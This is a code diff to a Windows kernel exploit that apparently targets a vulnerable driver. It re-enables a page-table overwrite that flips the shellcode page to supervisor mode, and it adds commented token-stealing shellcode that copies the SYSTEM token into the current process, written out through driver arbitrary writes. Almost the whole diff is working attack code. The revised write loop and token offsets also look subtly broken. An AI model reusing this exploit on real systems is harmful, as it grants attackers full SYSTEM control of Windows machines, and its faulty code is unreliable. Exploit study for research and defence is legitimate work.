@@ -83,7 +83,7 @@ int main()
                 Phase 4: Overwrite current PTE U/S for shellcode page an S (Supervisor Kernel)
             */
             
-            //OverridePTESuperVisorControlBits(shellcodePTEBitsPtr,PTEAddressPTR,driverHandle);
+            OverridePTESuperVisorControlBits(shellcodePTEBitsPtr,PTEAddressPTR,driverHandle);
             /*
                 Phase 5: Shellcode
             */
@@ -280,39 +280,26 @@ bool ExecuteShellcodeByNtQueryIntervalProfile()
 
 void *GenerateShellCode(HANDLE driverHandle)
 {
-/*
-const unsigned char payload[] = {
-    "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              // mov rax,[gs:0x188]  ; Current thread (KTHREAD)
-    "\x48\x8B\x80\xB8\x00\x00\x00"                      // mov rax,[rax+0xb8]  ; Current process (EPROCESS)
-    "\x48\x89\xC3"                                      // mov rbx,rax         ; Copy current process to rbx
-    "\x48\x8B\x9B\xF0\x02\x00\x00"                      // mov rbx,[rbx+0x2f0] ; ActiveProcessLinks
-    "\x48\x81\xEB\xF0\x02\x00\x00"                      // sub rbx,0x2f0       ; Go back to current process
-    "\x48\x8B\x8B\xE8\x02\x00\x00"                      // mov rcx,[rbx+0x2e8] ; UniqueProcessId (PID)
-    "\x48\x83\xF9\x04"                                  // cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
-    "\x75\xE5"                                          // jnz 0x13            ; Loop until SYSTEM PID is found
-    "\x48\x8B\x8B\x58\x03\x00\x00"                      // mov rcx,[rbx+0x358] ; SYSTEM token is @ offset _EPROCESS + 0x358
-    "\x80\xE1\xF0"                                      // and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
-    "\x48\x89\x88\x58\x03\x00\x00"                      // mov [rax+0x358],rcx ; Copy SYSTEM token to current process
-    "\x48\x31\xC0"                                      // xor rax,rax         ; set NTSTATUS SUCCESS
-    "\xC3"                                              // ret                 ; Done!
-};
-*/
     int j=0;
-
-    payload[0] = 0x0000018825048b4865;
-    payload[1] = 0x000000B8808B4800;
-    payload[2] = 0x02F09B8B48C38948; 
-    payload[3] = 0x0002F0EB81480000;
-    payload[4] = 0x000002E88B8B4800;
-    payload[5] = 0x8B48E57504F98348;
-    payload[6] = 0xF0E180000003608B;
-    payload[7] = 0x4800000360888948;
-    payload[8] = 0x0000000000C3C031;
-
+    const unsigned char payload[] = {
+        "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              // mov rax,[gs:0x188]  ; Current thread (KTHREAD)
+        "\x48\x8B\x80\xB8\x00\x00\x00"                      // mov rax,[rax+0xb8]  ; Current process (EPROCESS)
+        "\x48\x89\xC3"                                      // mov rbx,rax         ; Copy current process to rbx
+        "\x48\x8B\x9B\xF0\x02\x00\x00"                      // mov rbx,[rbx+0x2f0] ; ActiveProcessLinks
+        "\x48\x81\xEB\xF0\x02\x00\x00"                      // sub rbx,0x2f0       ; Go back to current process
+        "\x48\x8B\x8B\xE8\x02\x00\x00"                      // mov rcx,[rbx+0x2e8] ; UniqueProcessId (PID)
+        "\x48\x83\xF9\x04"                                  // cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
+        "\x75\xE5"                                          // jnz 0x13            ; Loop until SYSTEM PID is found
+        "\x48\x8B\x8B\x58\x03\x00\x00"                      // mov rcx,[rbx+0x358] ; SYSTEM token is @ offset _EPROCESS + 0x358
+        "\x80\xE1\xF0"                                      // and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
+        "\x48\x89\x88\x58\x03\x00\x00"                      // mov [rax+0x358],rcx ; Copy SYSTEM token to current process
+        "\x48\x31\xC0"                                      // xor rax,rax         ; set NTSTATUS SUCCESS
+        "\xC3"                                              // ret                 ; Done!
+    };
     
     for (int i=0; i < 9;i++)
     {
-        SendToDriver(driverHandle,0x0022200B,(void*) &payload[i], (void*) (((unsigned long long) KUSER_SHARED_DATA)+j));
+        SendToDriver(driverHandle,0x0022200B,(void*) (&payload+j), (void*) (((unsigned long long) KUSER_SHARED_DATA)+j));
         j+=8;
     }
     return (void*) KUSER_SHARED_DATA;
